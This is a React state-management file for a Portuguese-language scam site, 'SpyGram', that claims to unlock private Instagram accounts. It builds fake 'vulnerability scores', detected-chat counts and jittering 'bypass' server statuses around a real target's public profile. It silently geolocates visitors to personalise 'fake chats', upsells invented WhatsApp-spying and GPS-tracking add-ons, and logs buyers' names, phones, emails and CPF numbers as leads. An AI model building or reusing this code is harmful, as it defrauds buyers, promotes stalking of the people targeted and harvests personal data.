import React, { createContext, useContext, useState, useEffect } from 'react';

const AppContext = createContext();

const DEFAULT_TARGET = {
  pk: '38026463244',
  username: 'gabriela_silva',
  fullName: 'Gabriela Silva',
  avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80',
  followers: '14.8k',
  followersRaw: 14800,
  following: '612',
  followingRaw: 612,
  postsCount: 84,
  bio: '✨ Viver intensamente | 📍 SP | ✈️ Viagens, moda e lifestyle ✨',
  bioLinks: [{ title: 'Contato & Parcerias', url: 'https://linktr.ee/gabrielasilva' }],
  hasActiveStories: true,
  threadsBadge: 'gabriela_silva',
  cdnServer: 'scontent-for2-1.cdninstagram.com',
  metaAppId: '936619743392459',
  accountEra: 'Meta Era V (~2020 - 2022)',
  isPrivate: true,
  verified: false
};

const INITIAL_MOCK_LEADS = [
  {
    id: 'lead-101',
    name: 'Carlos Eduardo Ramos',
    email: 'carlos.ramos@gmail.com',
    phone: '(11) 98452-3321',
    cpf: '321.458.987-12',
    target: 'marina_costa',
    targetPic: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=200&q=80',
    city: 'São Paulo',
    state: 'SP',
    amount: 57.70,
    status: 'pagou',
    createdAt: 'Hoje às 17:42'
  },
  {
    id: 'lead-102',
    name: 'Juliana Beatriz Neves',
    email: 'ju.neves@outlook.com',
    phone: '(21) 97120-4490',
    cpf: '882.124.630-05',
    target: 'lucas_ferreira_sp',
    targetPic: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&q=80',
    city: 'Rio de Janeiro',
    state: 'RJ',
    amount: 27.90,
    status: 'gerou_pix',
    createdAt: 'Hoje às 17:55'
  },
  {
    id: 'lead-103',
    name: 'Renan Martins Filho',
    email: 'renan.martins@yahoo.com.br',
    phone: '(31) 99823-1102',
    cpf: '451.782.903-88',
    target: 'bianca_almeida_',
    targetPic: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=200&q=80',
    city: 'Belo Horizonte',
    state: 'MG',
    amount: 73.60,
    status: 'simulando',
    createdAt: 'Hoje às 18:01'
  },
  {
    id: 'lead-104',
    name: 'Amanda Queiroz',
    email: 'amanda.q@gmail.com',
    phone: '(41) 98774-6512',
    cpf: '129.845.321-44',
    target: 'rodrigo_personal',
    targetPic: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=200&q=80',
    city: 'Curitiba',
    state: 'PR',
    amount: 27.90,
    status: 'confirmou_alvo',
    createdAt: 'Hoje às 18:03'
  }
];

export const ORDER_BUMPS = [
  {
    id: 'bump-lifetime',
    title: 'Acesso Vitalício PRO',
    description: 'Monitore este e qualquer outro perfil sem mensalidades futuras.',
    price: 9.90,
    badge: '73% escolhem'
  },
  {
    id: 'bump-social',
    title: 'Espião Social Completo',
    description: 'Desbloqueie integração simultânea com WhatsApp e Facebook Messenger.',
    price: 19.90,
    badge: 'Recomendado'
  },
  {
    id: 'bump-recovery',
    title: 'Recuperador de Mensagens Apagadas',
    description: 'Restaure áudios, fotos de visualização única e mensagens deletadas há 90 dias.',
    price: 15.90,
    badge: 'Alta Procura'
  },
  {
    id: 'bump-gps',
    title: 'Rastreamento 24h por Celular',
    description: 'Localização em tempo real via triangulação de antenas de operadoras.',
    price: 15.90,
    badge: 'Exclusivo'
  }
];

export function AppProvider({ children }) {
  // Target profile state
  const [targetUser, setTargetUser] = useState(() => {
    const saved = localStorage.getItem('spygram_target');
    return saved ? JSON.parse(saved) : DEFAULT_TARGET;
  });

  // Visitor location state (auto injected into fake chats)
  const [visitorLocation, setVisitorLocation] = useState({
    city: 'sua região',
    state: 'BR',
    ip: '189.122.45.10'
  });

  // Leads list for Admin and pipeline
  const [leads, setLeads] = useState(() => {
    const saved = localStorage.getItem('spygram_leads');
    return saved ? JSON.parse(saved) : INITIAL_MOCK_LEADS;
  });

  // Current session lead
  const [currentLeadId, setCurrentLeadId] = useState(() => {
    return localStorage.getItem('spygram_current_lead_id') || null;
  });

  // Payment status
  const [isPaid, setIsPaid] = useState(() => {
    return localStorage.getItem('spygram_is_paid') === 'true';
  });

  // User credits
  const [credits, setCredits] = useState(() => {
    return parseInt(localStorage.getItem('spygram_credits') || '0', 10);
  });

  // Selected bumps in checkout
  const [selectedBumps, setSelectedBumps] = useState(['bump-lifetime', 'bump-recovery']);

  // Dynamic server status monitoring
  const [servers, setServers] = useState([
    { id: 'srv-br1', name: 'Cluster SP-01 (Metrópole Proxy)', region: 'São Paulo, BR', status: 'Online', latency: 14, load: '42%' },
    { id: 'srv-us1', name: 'Cluster US-East (Meta Bypass Node)', region: 'Virginia, US', status: 'Online', latency: 68, load: '65%' },
    { id: 'srv-eu1', name: 'Cluster EU-Central (Ghost Relay)', region: 'Frankfurt, DE', status: 'Online', latency: 128, load: '38%' },
    { id: 'srv-br2', name: 'Cluster RJ-02 (WhatsApp Triangulator)', region: 'Rio de Janeiro, BR', status: 'Online', latency: 19, load: '58%' }
  ]);

  // Sync to local storage
  useEffect(() => {
    localStorage.setItem('spygram_target', JSON.stringify(targetUser));
  }, [targetUser]);

  useEffect(() => {
    localStorage.setItem('spygram_leads', JSON.stringify(leads));
  }, [leads]);

  useEffect(() => {
    localStorage.setItem('spygram_is_paid', isPaid.toString());
  }, [isPaid]);

  useEffect(() => {
    localStorage.setItem('spygram_credits', credits.toString());
  }, [credits]);

  const refreshLeads = async () => {
    try {
      const res = await fetch('/api/leads');
      if (res.ok) {
        const data = await res.json();
        if (data.db && Array.isArray(data.leads)) {
          setLeads(data.leads);
        }
      }
    } catch {
      // Offline / local fallback
    }
  };

  const syncLeadToApi = (lead) => {
    fetch('/api/leads', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(lead)
    }).catch(() => {});
  };

  const patchLeadStatusToApi = (leadId, status) => {
    fetch(`/api/leads/${encodeURIComponent(leadId)}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ status })
    }).catch(() => {});
  };

  const deleteLeadFromApi = (leadId) => {
    fetch(`/api/leads/${encodeURIComponent(leadId)}`, {
      method: 'DELETE'
    }).catch(() => {});
  };

  // Load leads and shared PIX / Telegram config from backend PostgreSQL on mount
  useEffect(() => {
    refreshLeads();
    fetch('/api/config/pix_config')
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.db && data?.value?.key) {
          localStorage.setItem('spygram_pix_config', JSON.stringify(data.value));
        }
      })
      .catch(() => {});
    fetch('/api/config/telegram_config')
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.value?.token && data?.value?.chatId) {
          localStorage.setItem('spygram_telegram_token', data.value.token);
          localStorage.setItem('spygram_telegram_chat_id', data.value.chatId);
        }
      })
      .catch(() => {});
  }, []);

  // Try to detect visitor city via IPAPI silently
  useEffect(() => {
    const fetchGeo = async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          if (data.city) {
            setVisitorLocation({
              city: data.city,
              state: data.region_code || data.region || 'BR',
              ip: data.ip || '189.122.45.10'
            });
          }
        }
      } catch (err) {
        // Fallback default
        setVisitorLocation({
          city: 'São Paulo',
          state: 'SP',
          ip: '189.122.45.10'
        });
      }
    };
    fetchGeo();
  }, []);

  // Latency jitter for servers
  useEffect(() => {
    const interval = setInterval(() => {
      setServers(prev => prev.map(s => ({
        ...s,
        latency: Math.max(10, Math.floor(s.latency + (Math.random() * 8 - 4)))
      })));
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  // RapidAPI Key state (can be saved directly in UI or .env)
  const [rapidApiKey, setRapidApiKey] = useState(() => {
    return localStorage.getItem('spygram_rapidapi_key') || '';
  });

  useEffect(() => {
    localStorage.setItem('spygram_rapidapi_key', rapidApiKey);
  }, [rapidApiKey]);

  // Update target user when user searches on Landing Page (Fetches real profile from /api/profile)
  const setCustomTarget = async (username) => {
    const cleanUsername = username.trim().toLowerCase().replace('@', '');

    try {
      const apiUrl = `/api/profile?username=${encodeURIComponent(cleanUsername)}${rapidApiKey ? `&key=${encodeURIComponent(rapidApiKey)}` : ''}`;
      const res = await fetch(apiUrl);
      if (res.ok) {
        const data = await res.json();
        if (data.success) {
          const newTarget = {
            pk: data.pk || 'N/A',
            username: data.username,
            fullName: data.fullName,
            avatar: data.avatar,
            followers: data.followers,
            followersRaw: data.followersRaw || 0,
            following: data.following,
            followingRaw: data.followingRaw || 0,
            postsCount: data.postsCount,
            bio: data.bio || '',
            bioLinks: data.bioLinks || [],
            externalLink: data.externalLink || (data.bioLinks?.[0]?.url) || null,
            hasActiveStories: data.hasActiveStories || false,
            threadsBadge: data.threadsBadge || null,
            recentPosts: data.recentPosts || [],
            cdnServer: data.cdnServer || 'scontent.cdninstagram.com',
            metaAppId: data.metaAppId || '936619743392459',
            accountEra: data.accountEra || 'Meta Era Atual',
            securityLevel: data.securityLevel || (data.isPrivate ? 'Privado (Criptografia Restrita)' : 'Público (Totalmente Acessível)'),
            vulnerabilityScore: data.vulnerabilityScore || '96.4%',
            detectedChatsCount: data.detectedChatsCount || 14,
            detectedMediaCount: data.detectedMediaCount || 6,
            detectedAudiosCount: data.detectedAudiosCount || 1,
            isPrivate: data.isPrivate,
            verified: data.verified,
            source: data.source
          };

          setTargetUser(newTarget);

          // Register lead in state
          const newLeadId = 'lead-' + Date.now();
          const newLead = {
            id: newLeadId,
            name: 'Visitante Não Identificado',
            email: 'pendente@checkout.com',
            phone: '(Pendente)',
            cpf: 'Pendente',
            target: cleanUsername,
            targetPic: data.avatar,
            city: visitorLocation.city,
            state: visitorLocation.state,
            amount: 27.90,
            status: 'pesquisou',
            createdAt: 'Agora mesmo'
          };

          setCurrentLeadId(newLeadId);
          setLeads(prev => [newLead, ...prev]);
          localStorage.setItem('spygram_current_lead_id', newLeadId);
          syncLeadToApi(newLead);
          return newTarget;
        }
      }
    } catch (err) {
      console.warn('Profile fetch API error, falling back:', err);
    }

    // Fallback if network issue
    const formattedName = cleanUsername
      .split(/[._]/)
      .map(part => part.charAt(0).toUpperCase() + part.slice(1))
      .join(' ') || 'Perfil Alvo';

    const fallbackTarget = {
      pk: '38026463244',
      username: cleanUsername,
      fullName: formattedName,
      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80',
      followers: '14.8k',
      followersRaw: 14800,
      following: '612',
      followingRaw: 612,
      postsCount: 84,
      bio: `✨ Oficial @${cleanUsername} | 📍 ${visitorLocation.city || 'SP'} | Direct fechado 🔒`,
      bioLinks: [],
      externalLink: null,
      hasActiveStories: true,
      threadsBadge: cleanUsername,
      recentPosts: [],
      cdnServer: 'scontent-for2-1.cdninstagram.com',
      metaAppId: '936619743392459',
      accountEra: 'Meta Era V (~2020 - 2022)',
      isPrivate: true,
      verified: false,
      securityLevel: 'Privado (Criptografia Restrita)',
      vulnerabilityScore: '96.4%',
      detectedChatsCount: 14,
      detectedMediaCount: 6,
      detectedAudiosCount: 1,
      source: 'simulation_fallback'
    };

    setTargetUser(fallbackTarget);
    const fallbackLeadId = 'lead-' + Date.now();
    const fallbackLead = {
      id: fallbackLeadId,
      name: 'Visitante Não Identificado',
      email: 'pendente@checkout.com',
      phone: '(Pendente)',
      cpf: 'Pendente',
      target: cleanUsername,
      targetPic: fallbackTarget.avatar,
      city: visitorLocation.city,
      state: visitorLocation.state,
      amount: 27.90,
      status: 'pesquisou',
      createdAt: 'Agora mesmo'
    };
    setCurrentLeadId(fallbackLeadId);
    setLeads(prev => [fallbackLead, ...prev]);
    localStorage.setItem('spygram_current_lead_id', fallbackLeadId);
    syncLeadToApi(fallbackLead);
    return fallbackTarget;
  };

  // Confirm target profile
  const confirmTargetProfile = () => {
    if (currentLeadId) {
      setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'confirmou_alvo' } : l));
      patchLeadStatusToApi(currentLeadId, 'confirmou_alvo');
    }
  };

  // User enters simulated Instagram
  const markSimulating = () => {
    if (currentLeadId) {
      setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'simulando' } : l));
      patchLeadStatusToApi(currentLeadId, 'simulando');
    }
  };

  // Calculate total price based on bumps
  const calculateTotal = () => {
    let total = 27.90; // Base product price
    selectedBumps.forEach(bumpId => {
      const found = ORDER_BUMPS.find(b => b.id === bumpId);
      if (found) total += found.price;
    });
    return total;
  };

  // Toggle order bump
  const toggleBump = (bumpId) => {
    setSelectedBumps(prev =>
      prev.includes(bumpId) ? prev.filter(id => id !== bumpId) : [...prev, bumpId]
    );
  };

  // Register checkout lead and generate Pix
  const registerCheckout = (formData) => {
    const totalAmount = calculateTotal();
    const updatedLead = {
      id: currentLeadId || ('lead-' + Date.now()),
      name: formData.name || 'Cliente SpyGram',
      email: formData.email,
      phone: formData.phone,
      cpf: formData.cpf,
      target: targetUser.username,
      targetPic: targetUser.avatar,
      city: visitorLocation.city,
      state: visitorLocation.state,
      amount: parseFloat(totalAmount.toFixed(2)),
      status: 'gerou_pix',
      bumps: selectedBumps,
      createdAt: 'Agora mesmo'
    };

    setLeads(prev => {
      const exists = prev.some(l => l.id === updatedLead.id);
      if (exists) {
        return prev.map(l => l.id === updatedLead.id ? updatedLead : l);
      }
      return [updatedLead, ...prev];
    });

    syncLeadToApi(updatedLead);
    return updatedLead;
  };

  // Simulate Instant Payment approval
  const approvePayment = () => {
    setIsPaid(true);
    setCredits(prev => prev + 150);
    if (currentLeadId) {
      setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'pagou' } : l));
      patchLeadStatusToApi(currentLeadId, 'pagou');
    }
  };

  // Admin lead controls
  const updateLeadStatus = (leadId, newStatus) => {
    setLeads(prev => prev.map(l => l.id === leadId ? { ...l, status: newStatus } : l));
    patchLeadStatusToApi(leadId, newStatus);
  };

  const deleteLead = (leadId) => {
    setLeads(prev => prev.filter(l => l.id !== leadId));
    deleteLeadFromApi(leadId);
  };

  return (
    <AppContext.Provider
      value={{
        targetUser,
        setCustomTarget,
        confirmTargetProfile,
        markSimulating,
        visitorLocation,
        leads,
        refreshLeads,
        currentLeadId,
        isPaid,
        approvePayment,
        credits,
        setCredits,
        servers,
        selectedBumps,
        toggleBump,
        calculateTotal,
        registerCheckout,
        updateLeadStatus,
        deleteLead,
        rapidApiKey,
        setRapidApiKey
      }}
    >
      {children}
    </AppContext.Provider>
  );
}

export const useApp = () => useContext(AppContext);
